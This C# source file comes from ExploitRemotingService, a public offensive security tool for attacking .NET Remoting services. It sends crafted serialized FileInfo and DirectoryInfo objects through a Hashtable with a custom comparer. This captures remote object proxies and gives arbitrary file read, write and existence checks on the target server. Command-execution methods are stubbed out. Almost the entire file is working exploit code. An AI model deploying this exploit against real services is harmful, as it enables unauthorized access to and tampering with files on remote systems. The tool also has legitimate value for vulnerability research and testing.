//    ExploitRemotingService
//    Copyright (C) 2019 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using FakeAsm;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting;

namespace ExploitRemotingService
{
    class SerializerRemoteClass : MarshalByRefObject, IRemoteClass, IEqualityComparer
    {
        private CustomChannel _channel;

        public SerializerRemoteClass(CustomChannel channel)
        {
            _channel = channel;
        }

        private static object GetFileInfo(string path, bool directory)
        {
            FileSystemInfo info;

            if (directory)
            {
                info = new DirectoryInfo(".");
            }
            else
            {
                info = new FileInfo(".");
            }

            FieldInfo fi = typeof(FileSystemInfo).GetField("FullPath", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);

            fi.SetValue(info, path);

            return new SerializableWrapper(info);
        }

        private void SendRequestToServer(object retobj)
        {
            Hashtable hash = new Hashtable(this)
            {
                { retobj, "a" },
                { "Dummy", "a" }
            };

            Trace.WriteLine(_channel.SendRequest(hash, true).ToString());
        }

        public Process RunProcess(string process, string args)
        {
            throw new NotImplementedException("Specify --installdir parameter to enable");
        }

        public string RunCommand(string cmd)
        {
            throw new NotImplementedException("Specify --installdir parameter to enable");
        }

        public int ExecuteAssembly(byte[] asm, string[] args)
        {
            throw new NotImplementedException("Specify --installdir parameter to enable");
        }

        public DirectoryInfo GetDirectory(string path)
        {
            SendRequestToServer(GetFileInfo(path, true));

            return (DirectoryInfo)_capturedobj;
        }

        public void WriteFile(string path, byte[] contents)
        {
            SendRequestToServer(GetFileInfo(path, false));

            FileInfo obj = (FileInfo)_capturedobj;
            if (obj != null)
            {
                using (FileStream stm = obj.Open(FileMode.Create, FileAccess.ReadWrite))
                {
                    stm.Write(contents, 0, contents.Length);
                }
            }
        }

        public byte[] ReadFile(string path)
        {
            SendRequestToServer(GetFileInfo(path, false));

            if (_capturedobj is FileInfo obj)
            {
                using (FileStream stm = obj.OpenRead())
                {
                    List<byte> data = new List<byte>();
                    byte[] buf = new byte[1024];

                    int len = stm.Read(buf, 0, buf.Length);
                    while (len > 0)
                    {
                        data.AddRange(buf.Take(len));

                        len = stm.Read(buf, 0, buf.Length);
                    }

                    return data.ToArray();
                }
            }

            return new byte[0];
        }

        public bool FileExists(string path)
        {
            SendRequestToServer(GetFileInfo(path, false));

            if (_capturedobj is FileInfo obj)
            {
                return obj.Exists;
            }

            return false;
        }

        public string GetUsername()
        {
            throw new NotImplementedException("Specify --installdir parameter to enable");
        }

        public OperatingSystem GetOSVersion()
        {
            throw new NotImplementedException("Specify --installdir parameter to enable");
        }

        private object _capturedobj;

        bool IEqualityComparer.Equals(object x, object y)
        {
            return x.Equals(y);
        }

        int IEqualityComparer.GetHashCode(object obj)
        {
            if (obj is string)
            {
                return obj.GetHashCode();
            }
            else
            {
                if (RemotingServices.IsTransparentProxy(obj))
                {
                    _capturedobj = obj;
                }

                return 1;
            }
        }
    }
}
